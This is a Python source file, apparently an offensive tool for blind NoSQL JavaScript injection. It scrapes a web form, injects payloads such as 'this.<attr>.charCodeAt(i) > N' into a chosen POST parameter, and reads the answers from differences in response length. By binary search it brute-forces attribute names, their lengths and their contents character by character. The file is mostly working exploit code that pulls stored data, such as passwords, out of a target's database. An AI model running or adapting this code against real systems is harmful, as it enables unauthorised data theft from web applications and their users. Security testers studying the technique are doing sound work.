import random
import string
from bs4 import BeautifulSoup
import requests
from urllib.parse import quote, urlparse
import sys

def progress_bar(progress, total, bar_length=40):
    percent = float(progress) / total
    arrow = '=' * int(round(percent * bar_length) - 1) + '>'
    spaces = ' ' * (bar_length - len(arrow))
    
    sys.stdout.write(f"\rProgress: [{arrow}{spaces}] {int(percent * 100)}%")
    sys.stdout.flush()

def extract_form_data(url,scan_param_name):
    print(f"[+] Extracting form data from {url}")

    # Send HTTP request to the page
    response = requests.get(url)
    if not response or response.status_code != 200:
        print("[-] Error: Unable to fetch page.")
        exit()

    # Use BeautifulSoup to parse the HTML page
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the first form on the page
    form = soup.find('form')
    if not form:
        print("[-] Error: No form found on the page.")
        exit()

    # Extract input fields from the form
    form_data = {
        'action': form.get('action', ''),
        'method': form.get('method').upper(),
        'post_data': ""
    }

    if not form_data["method"]:
        print("Errror: No method extacted...")
        exit()

    param_counter = 0
    for input_tag in form.find_all('input'):
        name = input_tag.get('name', '')
        # For each input, store its name, type, and default value if any
        if name:
            if name == scan_param_name:                
                form_data["post_data"] += f"{name}=§{scan_param_name}§&"
                param_counter+=1
            else:            
                form_data["post_data"] += f"{name}=x&"
                param_counter+=1
    for button in form.find_all('button', attrs={'type': 'submit'}):
        name = button.get('name', '')
        if name:
            if name == scan_param_name:                
                form_data["post_data"] += f"{name}=§{scan_param_name}§&"
                param_counter+=1
            else:            
                form_data["post_data"] += f"{name}=x&"
                param_counter+=1
    form_data["post_data"] = form_data["post_data"].rstrip("&")
    form_data["param_count"] = param_counter
    return form_data


def generate_random_string(length):
    # Define the character set (uppercase, lowercase, digits)
    characters = string.ascii_letters + string.digits
    # Use random.choices to generate a random string
    random_string = ''.join(random.choices(characters, k=length))
    return random_string

def get_random_payload_response(form_data, scan_param_name, url):
    default_r_data = form_data["post_data"].replace(f"§{scan_param_name}§", generate_random_string(8))
    default_response = send_post_request(url, default_r_data)
    if not default_response:
        raise Exception("Default Response failed")
    return default_response


def send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response, debug=False):
    # create payload by replacing injection point 
    payload = extraction_point.replace("§inject§", extraction_payload)
    # insert payload into request
    r_data = form_data["post_data"].replace(f"§{insertion_param_name}§", quote(payload))
    response = send_post_request(url, r_data)
    if response == None:
        raise Exception("Extraction response is None")
    res = len(response.text) != len(default_response.text)
    if debug:
        print(url, r_data, res)
    return res

def send_post_request(r_url, r_data):
    #print("Requesting:",r_url, r_data)
    r = requests.post(r_url,
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data=r_data,
    )    
    return r

def brute_attribute_names(url, form_data,insertion_param_name, default_response, extraction_point, attributes_list):
    print(f"Brute Forcing attributes ...")
    attributes_list.add(insertion_param_name)
    found_attributes = []    
    for a in attributes_list:       
        extraction_payload = f'this.{a} != undefined'        
        if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):            
            attr_length = get_extraction_parameter_length(url, form_data,insertion_param_name, default_response, extraction_point, a)
            if attr_length:
                found_attributes.append([a,attr_length])
                print(f"\t[+] Found attribute: {a} with length {attr_length}")
    return found_attributes

def get_extraction_parameter_length(url, form_data,insertion_param_name, default_response, extraction_point, extraction_attribute_name):    
    low = 1 
    high = 1000 
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Caluclate the midpoint of the search area
        
        # test if length is bigger than mid
        extraction_payload = f'this.{extraction_attribute_name}.length > {mid}'    
        if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
            low = mid + 1 
            continue
        
        # test if length is smaller than mid
        extraction_payload = f'this.{extraction_attribute_name}.length < {mid}'    
        if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):
            high = mid - 1
            continue
        
        # length should be found
        extraction_payload = f'this.{extraction_attribute_name}.length = {mid}'    
        if send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response):                          
            return mid  

def brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, extraction_attribute_name, extraction_attribute_length):
    print(f"Brute forcing: {extraction_attribute_name} ...")
    result= ""
    for i in range(extraction_attribute_length):
        new_found = False
        low = 32 # Set low value of search area (' ')
        high = 127 # Set high value of search area ('~')
        mid = 0
        while low <= high:
            mid = (high + low) // 2 # Caluclate the midpoint of the search area
            
            # test if length is bigger than mid
            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) > {mid}'    
            if send_extraction_request(url, form_data, extraction_point, extraction_payload, scan_param_name, default_response):
                low = mid + 1 
                continue
            
            # test if length is smaller than mid
            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) < {mid}'   
            if send_extraction_request(url, form_data, extraction_point, extraction_payload, scan_param_name, default_response):
                high = mid - 1
                continue
            
            # length should be found
            result += chr(mid)              
            new_found = True
            progress_bar(i, extraction_attribute_length)
            break

        if not new_found:
            raise Exception(f"No new char could be found for: {extraction_attribute_name} at index {i} (max length: {extraction_attribute_length})")                                 
    progress_bar(extraction_attribute_length, extraction_attribute_length)
    print()
    return result

def remove_char_at_index(s, index):
    if index < 0 or index >= len(s):
        raise IndexError("Index out of range")
    return s[:index] + s[index + 1:]
